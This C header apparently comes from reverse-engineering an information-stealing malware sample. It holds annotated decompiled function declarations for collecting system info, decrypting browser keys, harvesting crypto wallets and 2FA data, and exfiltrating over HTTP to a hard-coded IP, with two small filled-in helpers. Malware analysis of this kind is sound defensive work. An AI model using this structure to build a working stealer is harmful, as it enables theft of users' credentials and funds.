#ifndef HEADER_H
#define HEADER_H

CHAR *__thiscall 
CollectSystemInfo(DWORD *SharedBuff);

char* __fastcall 
TrasStrings(char* src);

PWSTR 
*GetFilePath(wchar_t *Src);

int32_t __fastcall 
ProcessAndSendData(int32_t* inputData);

size_t __cdecl 
ProcessMultipartRequest(void *dataToSend, 
                        size_t dataSize, 
                        size_t *bufferSize, 
                        PSTR IPaddrs);

PSTR __fastcall 
ProccessingOrMapsTheWideCharacter(wchar16* lpWideCharStr)
{
        if (lpWideCharStr)
        // after searching for WideCharToMultiByte in msdn :
        /*
        int WideCharToMultiByte(
            UINT                               CodePage,
            DWORD                              dwFlags,
            _In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr,
            int                                cchWideChar,
            LPSTR                              lpMultiByteStr,
            int                                cbMultiByte,
            LPCCH                              lpDefaultChar,
            LPBOOL                             lpUsedDefaultChar
        );
        */
        // Maps a UTF-16 (wide character) string to a new
        // character string. The new character string is not
        // necessarily from a multibyte character set.
        {
            // - 0xfde9: code page 65001 (UTF-8)
            // - if there is 65001 (UTF-8) or the code page
            // 54936 (GB18030, Windows Vista and later) :
            // dwFlags must be set to either 0
            int32_t cbMultiByte = WideCharToMultiByte(0xfde9, 0, lpWideCharStr, 0xffffffff, nullptr, 0, nullptr, nullptr);
            
            if (cbMultiByte)
            {
                int32_t edx_1;
                edx_1 = cbMultiByte >= 0xffffffff;
                int32_t var_14_1 = -(edx_1) | (cbMultiByte + 1);
                PSTR lpMultiByteStr = Alloc();
                
                if (lpMultiByteStr)
                {
                    if (WideCharToMultiByte(0xfde9, 0, lpWideCharStr, 0xffffffff, lpMultiByteStr, cbMultiByte, nullptr, nullptr))
                        return lpMultiByteStr;
                    
                    _free(lpMultiByteStr);
                }
            }
        }
        
        return nullptr;
}

int __fastcall
ProcessFilePathAndUpdateSession(void **SysInfo, char *filePath);

int __thiscall 
checkFileStatus(WCHAR *TheRealOne)
{
    const WCHAR *resolvedPath;
    void (__stdcall *GetFullPathNameW)(void *, const WCHAR *, int);
    WCHAR *__TheRealOne__;
    __int16 pathLength;
    int (__stdcall *NtQueryFileAttributes)(int *, int, _DWORD *, void *, _DWORD, int, int, int, int, _DWORD, _DWORD);
    int res_OftheChecks;
    int __res_OftheChecks__;
    void (__stdcall *NtCleanup)(int);
    int result;

    resolvedPath = (const WCHAR *)calloc(260, 2);
    GetFullPathNameW(TheRealOne, resolvedPath, 260);

    res_OftheChecks = 0;
    __TheRealOne__ = (WCHAR *)calloc(280, 2);
    lstrcatW(__TheRealOne__, L"\\??\\");
    lstrcatW(__TheRealOne__, resolvedPath);

    _DWORD *Checkskiddi__TheRealOne__file = calloc(8, 1);
    _DWORD *fileCheckStruct = calloc(24, 1);
    fileCheckStruct[1] = 0;
    fileCheckStruct[4] = 0;
    fileCheckStruct[5] = 0;
    fileCheckStruct[0] = 24;
    fileCheckStruct[3] = 64; 
    fileCheckStruct[2] = Checkskiddi__TheRealOne__file;
    Checkskiddi__TheRealOne__file[0] = 2 * lstrlenW(__TheRealOne__);
    pathLength = lstrlenW(__TheRealOne__);
    Checkskiddi__TheRealOne__file[1] = __TheRealOne__;
    Checkskiddi__TheRealOne__file[2] = 2 * pathLength + 2;

    res_OftheChecks = NtQueryFileAttributes(&__res_OftheChecks__, 1179785, fileCheckStruct, Checkskiddi__TheRealOne__file, 0, 128, 3, 1, 32, 0, 0);

    NtCleanup(res_OftheChecks);

    result = __res_OftheChecks__;
    if (res_OftheChecks < 0)
        return 0;

    return result;
}

int 
verifyFileStatus(WCHAR *TheRealOne)
{
    int result;
    void (__stdcall *NtQueryAttributesFile)(int);
    int result__;

    result = checkFileStatus(TheRealOne);
    if (!result)
        return result;

    result__ = result;
    NtQueryAttributesFile(result__);

    return 1;
}

int __cdecl 
WinnetDllFuncRelatedExfiltrationRoutineetc(const char *postData, 
                                           int dataSize, 
                                           int extraParam,
                                           PSTR ip195);

void 
DecryptKeyData(const WCHAR *TheRealOne_, 
                int *rawFileData, 
                int *fileDataSize);

int __fastcall 
ExtractFileInfoViaNTDLL(void *TheRealOne_, 
                        DWORD *encryptedKey, 
                        size_t *resultLength);

DWORD *__thiscall 
StripUTF8BOMAndParse(const char *encryptedKey);

int __thiscall 
ValidateKeyStructure(DWORD *keyV);

int __fastcall 
ExtractValueFromKeyPath(DWORD *table, 
                        const char *key);

void __fastcall 
CryptoWallrtsAnd2FA(LPCWSTR *BrowserAllInfo, 
                    void ***SysInfo);

int32_t __fastcall processPath(PWSTR fileExtension,
                                int32_t searchPath,
                                PWSTR destinationFolder,
                                int32_t recursionDepth,
                                int32_t** SysInfo);

#endif
